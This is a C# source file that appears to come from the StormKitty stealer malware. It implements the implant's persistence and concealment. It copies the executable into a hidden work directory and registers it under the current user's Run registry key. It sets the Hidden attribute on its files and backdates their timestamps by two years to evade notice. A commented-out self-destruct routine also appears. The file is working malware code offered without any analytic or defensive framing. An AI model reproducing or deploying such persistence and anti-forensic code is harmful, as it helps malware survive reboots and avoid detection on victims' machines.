using Stealer;
using System;
using System.IO;
using Microsoft.Win32;

namespace StormKitty.Implant
{
    internal sealed class Startup
    {
        // Install
        public static readonly string ExecutablePath = System.Reflection.Assembly.GetEntryAssembly().Location;
        private static readonly string InstallDirectory = Paths.InitWorkDir();
        private static readonly string InstallFile = Path.Combine(
            InstallDirectory, new FileInfo(ExecutablePath).Name);
        // Autorun
        private static readonly string StartupKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
        private static readonly string StartupName = Path.GetFileNameWithoutExtension(ExecutablePath);

        // Change file creation date
        public static void SetFileCreationDate(string path = null)
        {
            string filename = path;
            if (path == null) filename = ExecutablePath;
            // Log
            Logging.Log("SetFileCreationDate : Changing file " + filename + " creation data");

            DateTime time = new DateTime(
                DateTime.Now.Year - 2, 5, 22, 3, 16, 28);

            File.SetCreationTime(filename, time);
            File.SetLastWriteTime(filename, time);
            File.SetLastAccessTime(filename, time);
        }

        // Hide executable
        public static void HideFile(string path = null)
        {
            string filename = path;
            if (path == null) filename = ExecutablePath;
            // Log
            Logging.Log("HideFile : Adding 'hidden' attribute to file " + filename);
            new FileInfo(filename).Attributes |= FileAttributes.Hidden;
        }

        // Check if app installed to autorun
        public static bool IsInstalled()
        { 
            RegistryKey rkApp = Registry.CurrentUser.OpenSubKey(StartupKey, false);
            return rkApp.GetValue(StartupName) != null && File.Exists(InstallFile);
        }

        // Install module to startup
        public static void Install()
        {
            Logging.Log("Startup : Adding to autorun...");
            // Copy executable
            if (!File.Exists(InstallFile))
                File.Copy(ExecutablePath, InstallFile);
            // Add to startup
            RegistryKey rkApp = Registry.CurrentUser.OpenSubKey(StartupKey, true);
            if (rkApp.GetValue(StartupName) == null)
                rkApp.SetValue(StartupName, InstallFile);
            // Copy DotNetZip to install directory
            string dll = "DotNetZip.dll";
            string ZipDllCpPath = Path.Combine(InstallDirectory, dll);
            if (File.Exists(dll) && !File.Exists(ZipDllCpPath))
                File.Copy(dll, ZipDllCpPath);
            // Hide files & change creation date
            foreach (string file in new string[] { InstallFile, ZipDllCpPath })
                if (File.Exists(file))
                {
                    HideFile(file);
                    SetFileCreationDate(file);
                }
        }

        // Uninstall module from startup
        /*
        public static void Uninstall()
        {
            RegistryKey rkApp = Registry.CurrentUser.OpenSubKey(StartupKey, true);
            if (rkApp.GetValue(StartupName) != null)
                rkApp.DeleteValue(StartupName);
            SelfDestruct.Melt();
        } */

        // Executable is running from startup directory
        public static bool IsFromStartup()
        {
            return ExecutablePath.StartsWith(InstallDirectory);
        }

    }
}
